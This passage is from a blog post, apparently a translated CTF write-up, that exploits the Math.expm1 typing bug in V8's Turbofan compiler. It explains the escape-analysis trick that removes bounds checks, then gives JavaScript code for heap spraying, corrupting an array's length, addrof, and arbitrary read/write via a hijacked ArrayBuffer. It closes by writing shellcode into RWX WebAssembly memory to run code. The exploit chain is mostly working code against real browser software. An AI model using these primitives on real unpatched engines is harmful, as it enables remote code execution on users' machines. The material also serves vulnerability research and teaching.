<p>Let’s see how the folding happens. ConstantFoldingReducer will propagate -0 constants (for example, if we use a variable with constant value -0). As we observed before, TypedOptimization will reduce a SameValue node that compares with constant -0 to a ObjectIsMinusZero node. Later in the pipeline, the SimplifiedLowering pass can perform further reductions on ObjectIsMinusZero nodes (see <span class="exturl" data-url="aHR0cHM6Ly9jcy5jaHJvbWl1bS5vcmcvY2hyb21pdW0vc3JjL3Y4L3NyYy9jb21waWxlci9zaW1wbGlmaWVkLWxvd2VyaW5nLmNjP3JjbD1kZGUyNTg3MmY1ODk1MWJiMDE0OGNmNDNkNmE1MDRhYjJmMjgwNDg1Jmw9MzA3OQ==">simplified-lowering.cc<i class="fa fa-external-link-alt"></i></span>). Since the Math.expm1 static type does not include -0, SimplifiedLowering will fold the ObjectIsMinusZero node into a false constant. Therefore, we need to keep SameValue until SimplifiedLowering: when typing in UpdateFeedbackType, it will propagate type information from SameValue nodes, but it won’t reduce them further. Keeping SameValue around means that the analyzer cannot know that we’re comparing with -0 until after the last TypedOptimization.</p>
<p>This leaves us with two options. Either we gain the information during escape analysis, or in the simplified lowering before the typer runs. Simplified lowering also chooses machine representations for values, and back-propagates representation feedback before typing. This is where I messed up during the CTF. While I was familiar with V8’s codebase, figuring out all the internals laid out in this post left me quite tired. When looking at the pipeline, my brain just skipped over the escape analysis (probably because it was wrapped in a conditional) and I thought I had to use the simplified lowering. Spoiler alert: you’re not going to get anywhere. Lesson learned: re-run your methodical approach through a rubber duck.</p>
<p>Quick refresher on escape analysis. Consider this code:</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">function</span> <span class="function"><span class="title">f</span></span>() &#123;</span><br><span class="line">    <span class="built_in">let</span> o = &#123;a: 5&#125;;</span><br><span class="line">    <span class="built_in">return</span> o.a;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>Clearly, it can be rewritten as:</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">function</span> <span class="function"><span class="title">f</span></span>() &#123;</span><br><span class="line">    <span class="built_in">let</span> o_a = 5;</span><br><span class="line">    <span class="built_in">return</span> o_a;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>While o had to be a concrete heap allocation, o_a can be dematerialized, and transformed in a stack or register variable (more efficient), or constant-folded into the return statement.</p>
<p>Now let’s add a call to a function g in the middle:</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">function</span> <span class="function"><span class="title">f</span></span>() &#123;</span><br><span class="line">    <span class="built_in">let</span> o = &#123;a: 5&#125;;</span><br><span class="line">    g(o);</span><br><span class="line">    <span class="built_in">return</span> o.a;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>The optimization is no longer valid, because g could save a reference to o in a global variable. Therefore, we can’t transform o in a stack allocation, because the global reference would outlive the stack variable, which is only valid as long as the scope of f is alive. We say that o has escaped the scope of f: the goal of escape analysis is to identify which objects escape, so that the non-escaping ones can be dematerialized.</p>
<p>The implication is that until escape analysis runs, the analyzer sees o.a as an access to a field through an object reference: it doesn’t know anything about its type because it can’t make assumptions on o. This is perfect for us. Code speaks louder than words:</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">function</span> foo(x) &#123;</span><br><span class="line">    <span class="built_in">let</span> a = [0.1, 0.2, 0.3, 0.4];</span><br><span class="line">    <span class="built_in">let</span> o = &#123;mz: -0&#125;;</span><br><span class="line">    <span class="built_in">let</span> b = Object.is(Math.expm1(x), o.mz);</span><br><span class="line">    <span class="built_in">return</span> a[b * 1337];</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>Now the second parameter to Object.is is the field mz in o. Before escape analysis, the analyzer has no idea it is a constant -0, so TypedOptimization will keep a SameValue node. The escape analysis finds that o doesn’t escape, and will dematerialize it and propagate the constant, so we get a SameValue with constant -0 before the simplified lowering. Then, the last typing run will determine SameValue is always false, and propagate this information, resulting in the elimination of the bounds check. Indeed, if you run the code, it’ll return “strange” values because it is reading memory from the heap past the array bounds (try playing around with the index).</p>
<p>Great, we got an OOB access! This is just the beginning, though: we need to build a few primitives on top of this.</p>
<h2 id="JavaScript-exploitation-primitives"><a href="#JavaScript-exploitation-primitives" class="headerlink" title="JavaScript exploitation primitives"></a>JavaScript exploitation primitives</h2><p>JavaScript exploits follow certain common patterns. On top of the bug, the exploit writer builds more abstract primitives, which grant more freedom in corrupting memory.</p>
<p>Two common primitives are addrof and fakeobj. The addrof primitive takes an object and gives us the memory address of that object. This is needed because modern systems employ ASLR (Address Space Layout Randomization), so the locations of memory regions (code, heap, libraries, stack, …) are randomized and unknown to the attacker. Moreover, the heap of a JS engine is very crowded, so predicting addresses of objects is fragile. The fakeobj primitive takes a memory address and gives back an object reference backed by that memory. It can be used to craft fake JavaScript objects, by getting a reference backed by an attacker-controlled buffer.</p>
<ul>
<li><img src="https://raw.githubusercontent.com/wiki/FDlucifer/FDlucifer.github.io/math-expm1-v83.png"></li>
</ul>
<p>When the bug is an OOB, the usual setup is to have an array of doubles A, on which we can perform OOB accesses, and an object with inline properties (or an array of objects) B that is placed after A in memory. We assume the attacker knows the offset between the two (it can be found at runtime), so the OOB on A can be used to access B’s memory. The trick is that accesses through A see memory as doubles (assuming elements are unboxed fast doubles), while B contains pointers to objects. To implement addrof, we assign the object to a property of B: this will store the object’s address in a cell in B’s memory. Then, we use the OOB on A to read that memory cell as a double, and decode it to an integer (their memory representations differ). The fakeobj primitive is symmetric. We encode the object’s address as a double, then use the OOB on A to store it into B’s memory: now B’s property contains a reference to the fake object, which we can return.</p>
<p>The most powerful primitive is the arbitrary read/write, which allows to read or write data at any memory address. It’s usually built through an <span class="exturl" data-url="aHR0cHM6Ly9kZXZlbG9wZXIubW96aWxsYS5vcmcvZW4tVVMvZG9jcy9XZWIvSmF2YVNjcmlwdC9SZWZlcmVuY2UvR2xvYmFsX09iamVjdHMvQXJyYXlCdWZmZXI=">ArrayBuffer<i class="fa fa-external-link-alt"></i></span>. Internally, the backing buffer is stored out-of-line, and the ArrayBuffer object includes a pointer to it, along with its size. Therefore, an attacker-controlled ArrayBuffer can point to anywhere in memory. This would also be possible with normal arrays, but ArrayBuffer has another advantage: it can be overlaid with <span class="exturl" data-url="aHR0cHM6Ly9kZXZlbG9wZXIubW96aWxsYS5vcmcvZW4tVVMvZG9jcy9XZWIvSmF2YVNjcmlwdC9SZWZlcmVuY2UvR2xvYmFsX09iamVjdHMvVHlwZWRBcnJheQ==">typed arrays<i class="fa fa-external-link-alt"></i></span> and <span class="exturl" data-url="aHR0cHM6Ly9kZXZlbG9wZXIubW96aWxsYS5vcmcvZW4tVVMvZG9jcy9XZWIvSmF2YVNjcmlwdC9SZWZlcmVuY2UvR2xvYmFsX09iamVjdHMvRGF0YVZpZXc=">DataView<i class="fa fa-external-link-alt"></i></span> views, which allow easy manipulation of raw memory. The ArrayBuffer can be built in two ways: by using some other primitive (e.g., stable OOB) to corrupt an existing ArrayBuffer’s pointer and size, or by crafting a fake ArrayBuffer through a fakeobj primitive.</p>
<p>Let’s get back to our bug. Ideally, to properly encapsulate the OOB, we’d like a function that takes an array, an index, and performs the OOB (read or write). Taking any index is simple enough, you just need to convince the typer that you’re multiplying b by a number (e.g., bitwise AND with Number.MAX_SAFE_INTEGER before multiplication). However, I found that extending to any array was very fragile. I wouldn’t be surprised if there was a way to get it to work, but I found it hard to keep typing info intact and getting the optimizer to eliminate the bounds check, also because we’re pretty late in the optimization pipeline. Instead, I decided to embrace the fleeting nature of this OOB, and use it just once to build a more reliable and repeatable OOB.</p>
<p>The idea is to groom the heap in such a way that we’ll have three objects allocated after the array on which we apply the bug (we’ll call it origin array):</p>
<ul>
<li>an array of fast doubles, which we’ll call OOB array;</li>
<li>an object with inline properties, the victim object;</li>
<li>an ArrayBuffer, the victim buffer.</li>
</ul>
<p>We’ll keep global references to all three for later. The order of the two victims doesn’t matter, as long as they’re after the OOB array. With this layout, we can use the origin array OOB to corrupt the length of the OOB array to a large value. Now the OOB array gives us repeatable OOB via normal element access. Then, we can use OOB to the victim object to implement an addrof primitive, and OOB to the victim buffer to implement arbitrary read/write. We won’t need fakeobj.</p>
<h2 id="Building-the-primitives"><a href="#Building-the-primitives" class="headerlink" title="Building the primitives"></a>Building the primitives</h2><p>This is the heap layout that we’re shooting for:</p>
<ul>
<li><img src="https://raw.githubusercontent.com/wiki/FDlucifer/FDlucifer.github.io/math-expm1-v84.png"></li>
</ul>
<p>Each JavaScript array is made of two heap objects: a JSArray, which represents the actual JavaScript array object, and a FixedArray, which is an internal fixed-size array type used as backing store for the array elements (this holds for an array with none or few holes, otherwise, it gets downgraded to a dictionary object). Both have a length field. For the JSArray, it is the actual JavaScript length (which is checked during array accesses). For the FixedArray, it is the length of the backing store, which can be larger than the JavaScript array size (in case of over-allocation). The order of JSArray and FixedArray may vary, but we’ll find them dynamically, so it doesn’t matter.</p>
<p>V8’s heap is managed by a bump allocator and a generational garbage collector (I’m oversimplifying, e.g., see <span class="exturl" data-url="aHR0cHM6Ly92OC5kZXYvYmxvZy9vcmlub2NvLXBhcmFsbGVsLXNjYXZlbmdlcg==">here<i class="fa fa-external-link-alt"></i></span>). Being a bump allocator, the order of objects in memory follows the order of allocation, as long as the GC doesn’t move too much stuff around, so it should be fine to just allocate our objects in order. For increased realiability, I’m going to spray large amounts of objects on the heap, and keep references to these objects to prevent the GC from collecting them. This should help linearizing the heap.</p>
<p>In reality, the spray is also a side effect of how we exploit the bug. We have to allocate the OOB array and the victims after the origin array, but before accessing the origin array to corrupt the OOB array’s length. Therefore, the allocations have to be part of the function that tricks the typer (foo in the earlier examples). This is going to be called a lot of times in a loop to force JIT compilation, so we’ll get a lot of allocations. I tried using a flag to only allocate on the last call (the -0 one), but that messed up the optimization, and I wanted a spray anyway.</p>
<p>Here’s the full plan for our primitives:</p>
<ul>
<li><img src="https://raw.githubusercontent.com/wiki/FDlucifer/FDlucifer.github.io/math-expm1-v85.png"></li>
</ul>
<p>We use the typing bug to corrupt the OOB array’s length via the origin OOB. After that, we’re home free: the OOB array now gives us OOB accesses to the other objects whenever we want. This construction exploits the bug only once, which is desirable since it is not easy to code around it. The OOB array will be the only array of length 2, which allows us to find its location dynamically by scanning the memory for the value 2 using the origin OOB. This is more reliable than using fixed offsets, and can tolerate some variation in heap layout. Note that the length 2 is present both in the JSArray and in the FixedArray, but we’re interested in finding and corrupting the JSArray’s length. The elements of the OOB array (0.4 and 0.5) will act as markers to distinguish between the JSArray and the backing FixedArray.</p>
<p>Once the OOB array is corrupted, we build addrof through OOB to the victim object, and arbitrary read/write through OOB to the victim buffer, by changing its backing pointer to the desired address. The objects have markers in them: an inline property with value 0x41414141 in the victim object, and a size of 0x41 in the victim buffer. This way, we can locate them by scanning memory for those markers through reads from the OOB array.</p>
<p>Let’s implement this. We’ll use three global arrays (arrs, objs, and bufs) to store sprayed instances. To handle 64-bit integers, I will use the utilities from <span class="exturl" data-url="aHR0cHM6Ly9naXN0LmdpdGh1Yi5jb20vc2FlbG8vNTI5ODVmZTQxNWNhNTc2Yzk0ZmMzZjE5NzVkYmU4Mzc=">this exploit<i class="fa fa-external-link-alt"></i></span> by Samuel Groß.</p>
<p>The function starts as usual, by triggering the typer bug:</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">let</span> o = &#123;mz: -0&#125;;</span><br><span class="line"><span class="built_in">let</span> b = Object.is(Math.expm1(x), o.mz);</span><br></pre></td></tr></table></figure>

<p>Then we allocate the objects, and save them to the global arrays:</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">let</span> a = [0.1, 0.2, 0.3, 0.4]; // origin array</span><br><span class="line">arrs.push([0.4, 0.5]); // OOB array</span><br><span class="line">objs.push(&#123;marker: 0x41414141, obj: &#123;&#125;&#125;); // victim object</span><br><span class="line">bufs.push(new ArrayBuffer(0x41)); // victim buffer</span><br></pre></td></tr></table></figure>

<p>Now we can search for the OOB array, corrupt the JSArray’s length, and we’re done:</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">let</span> new_size = (new Int64(<span class="string">&quot;7fffffff00000000&quot;</span>)).asDouble()</span><br><span class="line"><span class="keyword">for</span> (<span class="built_in">let</span> i = 4; i &lt; 20; i++) &#123;</span><br><span class="line">    <span class="built_in">let</span> val = a[b*i];</span><br><span class="line">    <span class="built_in">let</span> is_backing = a[b*(i+1)] === 0.4;</span><br><span class="line">    <span class="built_in">let</span> orig_size = Int64.fromDouble(val).toString();</span><br><span class="line">    <span class="built_in">let</span> good = (orig_size === <span class="string">&quot;0x0000000200000000&quot;</span> &amp;&amp; !is_backing);</span><br><span class="line">    a[b*i*good] = new_size;</span><br><span class="line">    <span class="keyword">if</span> (good)</span><br><span class="line">        <span class="built_in">break</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>Let’s look at this in detail. As I said before, I couldn’t get it to take a flag to do the corruption only on the final -0 call, so it’s structured in a way that will be harmless during the optimization loop. However, it will waste cycles, so I lowered the loop iterations to 10k (still enough to optimize) to keep it from getting too slow.</p>
<p>We iterate from the first OOB index (4) to some arbitrary limit (20). The boolean good will be true when we have found the JSArray’s length at the current index. First, we check that the value at the current index is 2. Due to alignment and word size differences, the length appears left-shifted by 32 bits. The value 2 can happen in two places: the JSArray length, and the corresponding FixedArray length. We’re interested in the JSArray. We know that the FixedArray length will be followed by the first element (0.4), so by looking at the next index we can determine whether we have found the JSArray or the FixedArray backing. Finally, two things can happen at a[b<em>i</em>good] = new_size:</p>
<ul>
<li><p>if we’re in the optimization loop (b is false) or we’re not looking at the JSArray’s length (good is false), it will assign to a[0], which is harmless;</p>
</li>
<li><p>if we’re looking at the JSArray’s length, it will be set to a large value (0x7fffffff).</p>
</li>
</ul>
<p>Once we return from the -0 call, we will (hopefully) have an array with corrupted length in arrs, and we can find it:</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">let</span> oob_arr = null;</span><br><span class="line"><span class="keyword">for</span> (<span class="built_in">let</span> i = 0; i &lt; arrs.length; i++) &#123;</span><br><span class="line">    <span class="keyword">if</span> (arrs[i].length !== 2) &#123;</span><br><span class="line">        oob_arr = arrs[i];</span><br><span class="line">        <span class="built_in">break</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>Now it’s time to use the OOB array to find the victim object, and the index in the OOB array at which its obj property is. This is a two-step process. First, we look for the 0x41414141 marker property, and change it to a different value (0x42424242). The next index is the obj property.</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">let</span> victim_obj = null;</span><br><span class="line"><span class="built_in">let</span> victim_obj_idx_obj = null;</span><br><span class="line"><span class="keyword">for</span> (<span class="built_in">let</span> i = 0; i &lt; 100; i++) &#123;</span><br><span class="line">    <span class="built_in">let</span> val = Int64.fromDouble(oob_arr[i]).toString();</span><br><span class="line">    <span class="keyword">if</span> (val === <span class="string">&quot;0x4141414100000000&quot;</span>) &#123;</span><br><span class="line">        oob_arr[i] = (new Int64(<span class="string">&quot;4242424200000000&quot;</span>)).asDouble();</span><br><span class="line">        victim_obj_idx_obj = i + 1;</span><br><span class="line">        <span class="built_in">break</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>Thanks to the different marker, we can find the victim object (whose obj index through oob_arr is victim_obj_idx_obj) in objs:</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">for</span> (<span class="built_in">let</span> i = 0; i &lt; objs.length; i++) &#123;</span><br><span class="line">    <span class="keyword">if</span> (objs[i].marker == 0x42424242) &#123;</span><br><span class="line">        victim_obj = objs[i];</span><br><span class="line">        <span class="built_in">break</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>The same two-step process applies to finding the victim buffer. This time we look for the 0x41 length, and change it to a different big size for marking (we don’t really need it to be that big, but it doesn’t hurt). The backing store pointer is immediately after the length.</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">let</span> victim_buf = null;</span><br><span class="line"><span class="built_in">let</span> victim_buf_idx_ptr = null;</span><br><span class="line"><span class="keyword">for</span> (<span class="built_in">let</span> i = 0; i &lt; 100; i++) &#123;</span><br><span class="line">    <span class="built_in">let</span> val = Int64.fromDouble(oob_arr[i]).toString();</span><br><span class="line">    <span class="keyword">if</span> (val === <span class="string">&quot;0x0000000000000041&quot;</span>) &#123;</span><br><span class="line">        oob_arr[i] = (new Int64(<span class="string">&quot;7fffffff&quot;</span>)).asDouble();</span><br><span class="line">        victim_buf_idx_ptr = i + 1;</span><br><span class="line">        <span class="built_in">break</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>Then we find the marked victim buffer by checking the lengths:</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">for</span> (<span class="built_in">let</span> i = 0; i &lt; bufs.length; i++) &#123;</span><br><span class="line">    <span class="keyword">if</span> (bufs[i].byteLength !== 0x41) &#123;</span><br><span class="line">        victim_buf = bufs[i];</span><br><span class="line">        <span class="built_in">break</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>At this point we have everything we need to build our primitives. For example, here’s addrof:</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">addrof(obj) &#123;</span><br><span class="line">    victim_obj.obj = obj;</span><br><span class="line">    <span class="built_in">return</span> Int64.fromDouble(oob_arr[victim_obj_idx_obj]);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>It assigns the object reference to the obj field of the victim object, and then reads out the pointer through the OOB array. Note that pointers in V8 are tagged to distinguish them from small integers: the lowest bit will always be set, so subtract one to get the real address.</p>
<p>Here’s the arbitrary read/write:</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">read</span>(addr, size) &#123;</span><br><span class="line">    oob_arr[victim_buf_idx_ptr] = addr.asDouble();</span><br><span class="line">    <span class="built_in">let</span> a = new Uint8Array(victim_buf, 0, size);</span><br><span class="line">    <span class="built_in">return</span> Array.from(a);</span><br><span class="line">&#125;,</span><br><span class="line">write(addr, bytes) &#123;</span><br><span class="line">    oob_arr[victim_buf_idx_ptr] = addr.asDouble();</span><br><span class="line">    <span class="built_in">let</span> a = new Uint8Array(victim_buf);</span><br><span class="line">    a.set(bytes);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>The first line of both methods uses the OOB array to change the backing store pointer of the victim buffer. Then, they create an Uint8Array on top of the ArrayBuffer to access memory as bytes, and perform the read/write.</p>
<p>On top of read and write one can easily write other specialized primitives for ease of use, which I leave to the reader. For the code execution exploit I’ll be using later, I suggest implementing read32 (reads a 32-bit integer), read64 (reads a 64-bit Int64), and write64 (writes a 64-bit Int64).</p>
<p>Our primitives are now implemented and stable. Let’s get code execution.</p>
<h2 id="Code-execution"><a href="#Code-execution" class="headerlink" title="Code execution"></a>Code execution</h2><p>Obviously, NX is enabled, so we can’t do code injection in “normal” memory areas. Once upon a time, V8’s JIT code pages had RWX permissions. Therefore, one could simply combine addrof and read to get the address of a compiled function’s code, overwrite it with shellcode through write, and then call the function. Unfortunately for us, that’s no longer the case: there’s a <span class="exturl" data-url="aHR0cHM6Ly9jcy5jaHJvbWl1bS5vcmcvY2hyb21pdW0vc3JjL3Y4L3NyYy9mbGFnLWRlZmluaXRpb25zLmg/cmNsPWRkZTI1ODcyZjU4OTUxYmIwMTQ4Y2Y0M2Q2YTUwNGFiMmYyODA0ODUmbD03MTc=">compilation flag<i class="fa fa-external-link-alt"></i></span> that controls this behavior, and by default it will write-protect the code by alternating between RW and RX.</p>
<p>As an aside, that flag can actually be changed at runtime (there’s a writable copy). Can we do it? Short answer: don’t waste your time, there are better ways (see below). Long answer (needs V8 internals knowledge): the flag is cached in the Heap instance, which can be located through a MemoryChunk, which can be found by scanning backwards page-by-page from a heap object for a valid header. However, changing the flag will alter the semantics of CodeSpaceMemoryModificationScope, and you’ll likely crash with the compiler trying to write to RX memory. I guess it could work if you get it to allocate a fresh MemoryChunk (maybe by using the large code object space?), but you also have to worry about background compilations and deoptimizations. Looks messy to me.</p>
<p>Apparently, the only option is a code-reuse attack (e.g., ROP). That would require a stack pivot, or finding a suitable stack frame to corrupt. I’m lazy, I’d like a better way. Fortunately, JavaScript is not the only language that gets compiled in V8: there’s WebAssembly, too. Its <span class="exturl" data-url="aHR0cHM6Ly9jcy5jaHJvbWl1bS5vcmcvY2hyb21pdW0vc3JjL3Y4L3NyYy9mbGFnLWRlZmluaXRpb25zLmg/cmNsPWRkZTI1ODcyZjU4OTUxYmIwMTQ4Y2Y0M2Q2YTUwNGFiMmYyODA0ODUmbD01NDM=">write-protect flag<i class="fa fa-external-link-alt"></i></span> is false by default, so compiled WebAssembly code is RWX.</p>
<p>We can compile some WebAssembly code, and get the address of an exported function’s JSFunction object through addrof:</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">let</span> wasm_code = new Uint8Array([...]);</span><br><span class="line"><span class="built_in">let</span> wasm_mod = new WebAssembly.Instance(new WebAssembly.Module(wasm_code), &#123;&#125;);</span><br><span class="line"><span class="built_in">let</span> f = wasm_mod.exports.function_name;</span><br><span class="line"><span class="built_in">let</span> f_addr = prims.addrof(f);</span><br></pre></td></tr></table></figure>

<p>Now we have to get the address of the compiled code from that JSFunction. The answer can be found by looking at how the JS-to-Wasm wrapper is built in <span class="exturl" data-url="aHR0cHM6Ly9jcy5jaHJvbWl1bS5vcmcvY2hyb21pdW0vc3JjL3Y4L3NyYy9jb21waWxlci93YXNtLWNvbXBpbGVyLmNjP3JjbD1kZGUyNTg3MmY1ODk1MWJiMDE0OGNmNDNkNmE1MDRhYjJmMjgwNDg1Jmw9NDgzOQ==">wasm-compiler.cc<i class="fa fa-external-link-alt"></i></span> (and with some debugging). From the JSFunction, we have to read the SharedFunctionInfo pointer. Then, from the shared info, we can get a pointer to the function data, which will be of type WasmExportedFunctionData. This has two fields we need: a pointer to a WasmInstanceObject, and the function index. From the WasmInstanceObject, we can get the address of the jump table start, which when added to the function index gives the address of the jump table entry for the function. That’s in the RWX code memory, and it’s the entry point to our function. I will leave figuring out the offsets and writing the chain of reads to the reader (you’ll have to go through some headers, not hard).</p>
<p>Once we have the entry point address, we can just write our shellcode to it and call the function:</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">let</span> shellcode = [0xcc, 0x48, 0xc7, 0xc0, 0x37, 0x13, 0x00, 0x00];</span><br><span class="line">prims.write(code_addr, shellcode);</span><br><span class="line">f();</span><br></pre></td></tr></table></figure>

<ul>
<li><img src="https://raw.githubusercontent.com/wiki/FDlucifer/FDlucifer.github.io/math-expm1-v86.png"></li>
</ul>
<p>What a beautiful sight.</p>
<h2 id="Conclusion"><a href="#Conclusion" class="headerlink" title="Conclusion"></a>Conclusion</h2><p>This was the hardest bug I’ve ever triggered. The exploit itself was pretty standard (about the last part, I haven’t seen WebAssembly publicly used before, but I’m sure others know about it), but fooling the typer was definitely an adventure. I walk away with an understanding of V8’s internals that, while still limited, is orders of magnitude better than when I started. I hope you enjoyed reading through this, even though it’s fairly long. And again, congrats to <span class="exturl" data-url="aHR0cHM6Ly90d2l0dGVyLmNvbS9fdHN1cm8=">@_tsuro<i class="fa fa-external-link-alt"></i></span> for finding and exploiting this bug for the first time: that was one hell of a job!</p>
<h2 id="译自"><a href="#译自" class="headerlink" title="译自"></a>译自</h2><ul>
<li><span class="exturl" data-url="aHR0cHM6Ly9hYmlvbmRvLm1lLzIwMTkvMDEvMDIvZXhwbG9pdGluZy1tYXRoLWV4cG0xLXY4LyNqYXZhc2NyaXB0LWV4cGxvaXRhdGlvbi1wcmltaXRpdmVz">Exploiting the Math.expm1 typing bug in V8<i class="fa fa-external-link-alt"></i></span></li>
</ul>

    </div>

    
    
    
        <div class="reward-container">
  <div></div>
  <button onclick="var qr = document.getElementById('qr'); qr.style.display = (qr.style.display === 'none') ? 'block' : 'none';">
    Donate
  </button>
  <div id="qr" style="display: none;">
      
      <div style="display: inline-block;">
        <img src="/images/wechatpay.png" alt="lUc1f3r11 WeChat Pay">
        <p>WeChat Pay</p>
      </div>
      
      <div style="display: inline-block;">
        <img src="/images/alipay.png" alt="lUc1f3r11 Alipay">
        <p>Alipay</p>
      </div>

  </div>
</div>

        

<div>
<ul class="post-copyright">
  <li class="post-copyright-author">
    <strong>Post author:  </strong>lUc1f3r11
  </li>
  <li class="post-copyright-link">
    <strong>Post link: </strong>
    <a href="https://fdlucifer.github.io/2021/02/15/Exploiting-the-Math-expm1-typing-bug-in-V8/" title="利用V8中的Math-expm1-typing漏洞">https://fdlucifer.github.io/2021/02/15/Exploiting-the-Math-expm1-typing-bug-in-V8/</a>
  </li>
  <li class="post-copyright-license">
    <strong>Copyright Notice:  </strong>All articles in this blog are licensed under <span class="exturl" data-url="aHR0cHM6Ly9jcmVhdGl2ZWNvbW1vbnMub3JnL2xpY2Vuc2VzL2J5LW5jLXNhLzQuMC8="><i class="fab fa-fw fa-creative-commons"></i>BY-NC-SA</span> unless stating additionally.
  </li>
</ul>
</div>

        

  <div class="followme">
    <p>Welcome to my other publishing channels</p>

    <div class="social-list">

        <div class="social-item">
          <a target="_blank" class="social-link" href="https://twitter.com/fdlucifer11">
            <span class="icon">
              <i class="fab fa-twitter"></i>
            </span>

            <span class="label">Twitter</span>
          </a>
        </div>

        <div class="social-item">
          <a target="_blank" class="social-link" href="https://t.me/FDkiller">
            <span class="icon">
              <i class="fab fa-telegram"></i>
            </span>

            <span class="label">Telegram</span>
          </a>
        </div>

        <div class="social-item">
          <a target="_blank" class="social-link" href="/images/wechat_channel.jpg">
            <span class="icon">
              <i class="fab fa-weixin"></i>
            </span>

            <span class="label">WeChat</span>
          </a>
        </div>
    </div>
  </div>


      <footer class="post-footer">
          <div class="post-tags">
              <a href="/tags/pwn/" rel="tag"># pwn</a>
          </div>

        


        
    <div class="post-nav">
      <div class="post-nav-item">
    <a href="/2021/02/14/Ophiuchi/" rel="prev" title="Hack-The-Box-walkthrough[Ophiuchi]">
      <i class="fa fa-chevron-left"></i> Hack-The-Box-walkthrough[Ophiuchi]
    </a></div>
      <div class="post-nav-item"></div>
    </div>
      </footer>
    
  </article>
  
  
  



          </div>
          

<script>
  window.addEventListener('tabs:register', () => {
    let { activeClass } = CONFIG.comments;
    if (CONFIG.comments.storage) {
      activeClass = localStorage.getItem('comments_active') || activeClass;
    }
    if (activeClass) {
      let activeTab = document.querySelector(`a[href="#comment-${activeClass}"]`);
      if (activeTab) {
        activeTab.click();
      }
    }
  });
  if (CONFIG.comments.storage) {
    window.addEventListener('tabs:click', event => {
      if (!event.target.matches('.tabs-comment .tab-content .tab-pane')) return;
      let commentClass = event.target.classList[1];
      localStorage.setItem('comments_active', commentClass);
    });
  }
</script>

        </div>
          
  
  <div class="toggle sidebar-toggle">
